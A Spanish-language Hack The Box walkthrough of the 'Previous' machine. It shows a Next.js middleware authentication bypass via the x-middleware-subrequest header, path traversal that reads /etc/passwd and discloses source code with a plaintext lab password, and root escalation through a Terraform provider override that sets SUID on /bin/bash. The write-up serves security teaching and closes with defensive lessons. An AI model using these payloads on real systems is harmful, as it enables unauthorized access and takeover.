## Enumeración Inicial

Iniciamos la fase de reconocimiento realizando un **escaneo básico con Nmap**, con el objetivo de identificar puertos abiertos en el host objetivo.

```bash
┌──(zikuta㉿zikuta)-[~/Desktop/htb/previous]
└─$ cat basico               
# Nmap 7.95 scan initiated Thu Jan 15 10:19:14 2026 as: /usr/lib/nmap/nmap --privileged -p- -sS -Pn -f --min-rate 3500 -oN basico 10.129.242.162
Warning: 10.129.242.162 giving up on port because retransmission cap hit (10).
Nmap scan report for previous.htb (10.129.242.162)
Host is up (0.14s latency).
Not shown: 63465 closed tcp ports (reset), 2068 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http                             
```

Resultado del escaneo:

`PORT   STATE SERVICE 22/tcp open  ssh 80/tcp open  http`

El host responde correctamente y únicamente expone los servicios **SSH (22)** y **HTTP (80)**, reduciendo la superficie de ataque inicial.

## Enumeración Exhaustiva de Servicios

Con los puertos identificados, procedemos a realizar un **escaneo más detallado** sobre los servicios descubiertos, utilizando detección de versiones y scripts por defecto.

```bash 
┌──(zikuta㉿zikuta)-[~/Desktop/htb/previous]
└─$ cat exhaustivo 
# Nmap 7.95 scan initiated Thu Jan 15 10:16:13 2026 as: /usr/lib/nmap/nmap --privileged -p22,80 -sC -sV -Pn -f -oN exhaustivo 10.129.242.162
Nmap scan report for 10.129.242.162
Host is up (0.68s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://previous.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 15 10:16:38 2026 -- 1 IP address (1 host up) scanned in 25.62 seconds
                                                 
```

Resultados relevantes:

`22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 80/tcp open  http    nginx 1.18.0 (Ubuntu)`

Además, Nmap indica un **redireccionamiento HTTP** hacia el dominio:

`http://previous.htb/`

Por lo tanto, identificamos:

- Sistema operativo: **Ubuntu Linux**
- Servidor web: **nginx 1.18.0**
- Dominio virtual configurado: **previous.htb**

Se procede a añadir el dominio al archivo `/etc/hosts` para una correcta resolución local.

## Reconocimiento Web

### Identificación de tecnologías

Con el dominio configurado, realizamos un reconocimiento inicial del stack web utilizando `whatweb`.

![[Pasted image 20260115171050.png]]
Salida relevante:

`Email[jeremy@previous.htb] X-Powered-By[Next.js] HTTPServer[nginx/1.18.0 (Ubuntu)] Script[application/json]`

A partir de esta información podemos destacar:

- Uso de **Next.js**, lo cual sugiere una aplicación moderna basada en React.
- Presencia de un **posible usuario válido**: `jeremy`.
- Backend servido por **nginx** sobre Ubuntu.

vemos un posible usuario `jeremy` y tambien vemos  `X-Powered-By[Next.js]` 
### Enumeración de rutas

Se realizó fuzzing de directorios con `feroxbuster`, sin encontrar rutas sensibles o contenido expuesto adicional.

No obstante, al interactuar manualmente con la aplicación web, se observan dos botones principales:

- **Docs**
- **Get Started**

Ambos redirigen a un **formulario de autenticación**, cuya URL es la siguiente:

```bash 
http://previous.htb/api/auth/signin?callbackUrl=%2Fdocs
```

Esto confirma el uso del sistema de autenticación **NextAuth**, comúnmente utilizado junto a Next.js.

![[Pasted image 20260115171801.png]]


## Análisis de Autenticación

Con el objetivo de analizar el flujo de autenticación, interceptamos la petición utilizando **Burp Suite**.

Petición capturada:

```bash
GET /api/auth/signin?callbackUrl=%2Fdocs HTTP/1.1

Host: previous.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: keep-alive

Cookie: next-auth.csrf-token=bca53cd64c99ed73c03a2baf1e993f01dacbd7c46ec2adb443fef1977a9d271b%7Cc81b735c87db086b7760855f375421a0fa4fb48288813b52fb174230c5d85e32; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000

Upgrade-Insecure-Requests: 1

Priority: u=0, i
```

Aquí observamos varios elementos clave:

- Uso de **CSRF tokens** (`next-auth.csrf-token`)
- Cookie de redirección (`next-auth.callback-url`)
- Arquitectura típica de **NextAuth + JWT**

---
## Análisis de Autenticación y Middleware (Next.js)

Durante el análisis de la funcionalidad de autenticación, se observó que al intentar acceder a recursos protegidos como `/docs`, la aplicación redirige automáticamente al endpoint de inicio de sesión de NextAuth:

`http://previous.htb/api/auth/signin?callbackUrl=%2Fdocs`

Esto indica que la aplicación utiliza **Next.js junto con NextAuth** para gestionar la autenticación y el control de acceso.

Al interceptar la petición con **Burp Suite**, se identificó un comportamiento relevante en las cookies enviadas al servidor:

`Cookie:  next-auth.csrf-token=... next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000`

La cookie `next-auth.callback-url` apunta a un recurso interno (`localhost:3000`), lo que sugiere que la aplicación confía en valores controlables por el cliente para gestionar redirecciones posteriores al proceso de autenticación.

---

##  Relación con Next.js Middleware

Next.js implementa **Middleware** como una capa que se ejecuta **antes de que la petición llegue a la lógica principal de la aplicación**. Este middleware suele utilizarse para:

- Autenticación
- Autorización
- Redirecciones
- Protección de rutas sensibles

En este caso, el acceso a `/docs` depende de una validación realizada en el middleware. Sin embargo, este mecanismo resultó vulnerable debido a una validación incorrecta de los encabezados y cookies asociados a la sesión.

---

##  Vulnerabilidad Identificada

### CVE-2025-29927 – Next.js Middleware Authorization Bypass

La aplicación resulta vulnerable a **CVE-2025-29927**, una vulnerabilidad crítica en **Next.js Middleware** que permite **eludir controles de autorización**.

Esta vulnerabilidad ocurre cuando el middleware confía en encabezados o estados manipulables por el cliente (como cookies o headers internos) para determinar si un usuario está autenticado, permitiendo que solicitudes especialmente construidas **bypassen completamente la lógica de autenticación**.

Según la documentación oficial de Next.js:

> _“Middleware allows you to run code before a request is completed. Based on the incoming request, you can modify the response by rewriting, redirecting, modifying headers, or responding directly.”_

En este escenario, la validación de acceso a rutas protegidas como `/docs` se realiza únicamente en el middleware, lo que permite explotar la vulnerabilidad para acceder a recursos restringidos **sin credenciales válidas**.

---
## Bypass de Autenticación mediante Next.js Middleware

### CVE-2025-29927

Teniendo en cuenta que la aplicación utiliza **Next.js Middleware** para proteger rutas como `/docs`, se procedió a comprobar si dicha validación podía ser eludida.

Para ello, se eliminan completamente las cookies de sesión (`next-auth.*`) y el token CSRF de la petición original, y se construye manualmente una solicitud directa a la ruta protegida `/docs`, añadiendo el encabezado especial `x-middleware-subrequest`.

---

###  Petición manipulada

```http
GET /docs HTTP/1.1 Host: previous.htb x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Priority: u=0, i`
```

![[Pasted image 20260115173122.png]]

---

###  Respuesta del servidor

```http
HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) X-Powered-By: Next.js Content-Type: text/html; charset=utf-8`
```


![[Pasted image 20260115173241.png]]

El servidor responde correctamente con un **HTTP 200 OK**, devolviendo el contenido completo de la página `/docs`, a pesar de que:

- No se enviaron cookies de autenticación
- No se proporcionó ningún token CSRF
- El usuario no inició sesión previamente

Esto confirma que el control de acceso fue completamente eludido.

---

###  Explicación técnica del bypass

La vulnerabilidad **CVE-2025-29927** se produce cuando el middleware de Next.js confía en el encabezado interno `x-middleware-subrequest` para determinar si una petición ya ha sido procesada por el middleware.

Al enviar múltiples valores `middleware:` en este encabezado, el framework interpreta erróneamente que la solicitud ya pasó por todas las capas de middleware, **omitiendo la ejecución de las validaciones de autenticación y autorización**.

Como resultado, la petición accede directamente a la ruta protegida sin ningún tipo de control de sesión.

---

###  Evidencia de acceso no autorizado

El contenido devuelto corresponde a la documentación interna de la aplicación, incluyendo:

- Navegación completa de `/docs`
- Recursos JavaScript internos (`/_next/static/...`)
- Mensaje visual indicando estado de sesión:

`<p class="text-sm text-gray-600">Logged in as <b>???</b></p>`

Esto confirma que la aplicación asume erróneamente un estado autenticado, aun cuando no existe una sesión válida.

---

##  Impacto de la vulnerabilidad

- Bypass completo de autenticación
- Acceso no autorizado a rutas protegidas
- Exposición de información interna
- Posible escalada de privilegios si existen funcionalidades sensibles detrás de otras rutas protegidas por middleware


--- 

## Acceso a rutas adicionales mediante bypass de middleware

Tras conseguir acceso no autenticado a `/docs`, se identificó un enlace adicional dentro de la documentación:

```http
href="/docs/examples"
```

Aplicando nuevamente el bypass del middleware (CVE-2025-29927), fue posible acceder sin autenticación a la ruta `/docs/examples`, confirmando que **todas las rutas protegidas dependen exclusivamente del middleware vulnerable**.

![[Pasted image 20260115173607.png]]

## Descarga de ejemplos y análisis del endpoint `/api/download`

Dentro de la sección _Examples_, se observa un botón **“Download the full example here!”**, el cual genera la siguiente petición:

```http
GET /api/download?example=hello-world.ts HTTP/1.1

Host: previous.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://previous.htb/docs/examples
Cookie: next-auth.csrf-token=bca53cd64c99ed73c03a2baf1e993f01dacbd7c46ec2adb443fef1977a9d271b%7Cc81b735c87db086b7760855f375421a0fa4fb48288813b52fb174230c5d85e32; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Este comportamiento sugiere que el backend lee archivos del sistema basándose directamente en el parámetro `example`, sin validación aparente.

## Local File Inclusion (LFI) mediante Path Traversal

Se procede a eliminar las cookies de sesión y a aplicar nuevamente el bypass del middleware, manipulando el parámetro `example` para intentar realizar **directory traversal**:

```http
GET /api/download?example=../../../../../../../etc/passwd HTTP/1.1

Host: previous.htb
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://previous.htb/docs/examples
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```


Respuesta del servidor

```http
HTTP/1.1 200 OK

Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 15 Jan 2026 22:38:03 GMT
Content-Type: application/zip
Content-Length: 787
Connection: keep-alive
Content-Disposition: attachment; filename="passwd"
ETag: "41amqg1v4m26j"

root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```

El contenido del archivo `/etc/passwd` es devuelto correctamente, confirmando una vulnerabilidad de **Local File Inclusion (LFI)**.

Entre los usuarios del sistema destacan:

```bash
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```

## Enumeración interna de la aplicación Next.js

Con LFI confirmado, el siguiente objetivo fue identificar archivos internos de la aplicación Next.js. Para ello, se accede al archivo:

```bash
.next/server/pages-manifest.json
```

![[Pasted image 20260115174610.png]]

### Respuesta

El archivo revela todas las rutas internas y su correspondencia con archivos del servidor:

![[Pasted image 20260115174636.png]]

Este archivo es especialmente interesante, ya que contiene la lógica de autenticación de la aplicación.


## Exposición de credenciales mediante Source Code Disclosure

Se procede a descargar el archivo de autenticación de NextAuth:


![[Pasted image 20260115174853.png]]


### Respuesta

El código fuente revela un proveedor de autenticación por credenciales:

![[Pasted image 20260115175322.png]]


De aquí se obtienen las siguientes credenciales:

| Usuario | Contraseña                     |
| ------- | ------------------------------ |
| jeremy  | MyNameIsJeremyAndILovePancakes |

## Acceso al sistema mediante SSH

Aunque el usuario `jeremy` no aparece en el archivo `/etc/passwd`, se intentó reutilizar las credenciales obtenidas para acceder al servicio SSH expuesto en el puerto 22.

![[Pasted image 20260115175535.png]]

La autenticación fue exitosa, confirmando que las credenciales de la aplicación web **fueron reutilizadas a nivel de sistema**, permitiendo obtener acceso interactivo al servidor.


# Escalada de Privilegios

##  Enumeración de privilegios sudo

Una vez obtenido acceso como el usuario `jeremy`, se procede a enumerar los privilegios sudo disponibles:


![[Pasted image 20260116014717.png]]

Esto indica que el usuario `jeremy` puede ejecutar **Terraform como root**, pero únicamente con el directorio de trabajo establecido en `/opt/examples` y usando el comando `apply`.

```bash
/usr/bin/terraform -chdir\=/opt/examples apply
```
## Análisis de la configuración Terraform

Se inspeccionan los archivos Terraform presentes en el directorio permitido:

```bash
jeremy@previous:~$ cat /opt/examples/*.tf
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
```

La configuración define un **provider personalizado** (`previous.htb/terraform/examples`), el cual es cargado dinámicamente por Terraform durante la ejecución

## Abuso de Terraform Provider (Privilege Escalation)

Terraform permite utilizar proveedores locales mediante **provider development overrides**, una funcionalidad pensada para desarrollo y pruebas.  
Esta característica permite forzar a Terraform a cargar un proveedor desde una ruta local arbitraria.

Dado que Terraform se ejecuta como **root** vía `sudo`, es posible abusar de este mecanismo para ejecutar código arbitrario con privilegios elevados.

## Creación de proveedor malicioso

Se crea un binario falso del proveedor que simplemente asigna el bit SUID a `/bin/bash`:

```bash 
jeremy@previous:~$ cat > /tmp/terraform-provider-examples << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF

chmod +x /tmp/terraform-provider-examples
```

## Configuración del override del provider

A continuación, se crea un archivo de configuración de Terraform para redirigir la carga del provider legítimo hacia nuestro binario malicioso:

```bash 
jeremy@previous:~$ cat > /tmp/previous.rc << 'EOF'                        
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/tmp"
  }
  direct {}
}
EOF

# Se exporta la variable de entorno necesaria para que Terraform lea esta configuración:Se exporta la variable de entorno necesaria para que Terraform lea esta configuración:

export TF_CLI_CONFIG_FILE=/tmp/previous.rc
```

## Ejecución del exploit

Se ejecuta el comando permitido con `sudo`:

```bash
jeremy@previous:~$ sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Durante la ejecución, Terraform intenta cargar el provider desde `/tmp`, ejecutando nuestro binario como **root**.  

Aunque Terraform muestra un error de carga del provider, el payload ya se ha ejecutado correctamente.

```bash
jeremy@previous:~$ sudo /usr/bin/terraform -chdir=/opt/examples apply
```
## Obtención de root

Con el bit SUID aplicado a `/bin/bash`, se obtiene una shell privilegiada:


![[Pasted image 20260116020228.png]]

---

## Conclusión

La máquina **Previous** presenta una cadena de vulnerabilidades que demuestra cómo una **aplicación moderna mal configurada**, basada en **Next.js**, puede comprometer completamente un sistema cuando se combinan fallos de diseño, errores de validación y malas prácticas de seguridad.

El compromiso del sistema comienza con una correcta fase de **enumeración**, donde se identifican únicamente dos servicios expuestos: **SSH** y **HTTP**. A pesar de la superficie de ataque reducida, el análisis del servicio web revela el uso de **Next.js junto con NextAuth**, lo que dirige la investigación hacia la lógica de autenticación y middleware.

La vulnerabilidad crítica **CVE-2025-29927** permite **eludir completamente el middleware de Next.js** mediante la manipulación del encabezado interno `x-middleware-subrequest`. Este fallo de diseño provoca que las rutas protegidas dependan exclusivamente del middleware para su control de acceso, permitiendo a un atacante **acceder a contenido restringido sin autenticación alguna**.

Una vez logrado el bypass de autenticación, se accede a la documentación interna de la aplicación (`/docs`), desde donde se identifica un endpoint vulnerable (`/api/download`) que permite la descarga de archivos locales sin una validación adecuada del parámetro `example`. Esto conduce a una vulnerabilidad de **Local File Inclusion (LFI)** mediante **Path Traversal**, confirmada con la lectura exitosa de `/etc/passwd`.

El LFI permite la enumeración interna de la aplicación Next.js, incluyendo archivos críticos como `.next/server/pages-manifest.json`, lo que facilita la localización del código fuente responsable de la autenticación. A partir de esta exposición de código, se obtienen **credenciales en texto plano** utilizadas por el proveedor de autenticación de NextAuth.

Estas credenciales resultan ser reutilizadas a nivel de sistema, permitiendo el acceso interactivo por **SSH** como el usuario `jeremy`, evidenciando una grave mala práctica de seguridad: **reutilización de credenciales entre la aplicación web y el sistema operativo**.

En la fase de escalada de privilegios, se identifica que el usuario `jeremy` puede ejecutar **Terraform como root** con restricciones aparentemente seguras. Sin embargo, el uso de un **provider personalizado** combinado con la funcionalidad de **provider development overrides** permite forzar la ejecución de un binario arbitrario como root. Este abuso culmina en la ejecución de código con privilegios elevados, logrando una shell **root** de manera confiable.

En conclusión, la máquina demuestra cómo:

- Un **bypass de autenticación** en middleware
- Combinado con **LFI**
- Derivando en **exposición de código fuente**
- Reutilización de credenciales
- Y un **mal uso de herramientas de automatización como Terraform**

pueden encadenarse para comprometer completamente un sistema moderno.

La máquina **Previous** es un excelente ejemplo de ataque **realista**, donde no se explotan servicios obsoletos, sino **errores lógicos y de diseño** en tecnologías actuales, destacando la importancia de:

- No confiar únicamente en middleware para controles de acceso
- Validar estrictamente entradas del usuario
- Proteger el código fuente
- Evitar reutilización de credenciales
- Limitar el uso de herramientas administrativas como `sudo` y Terraform

---
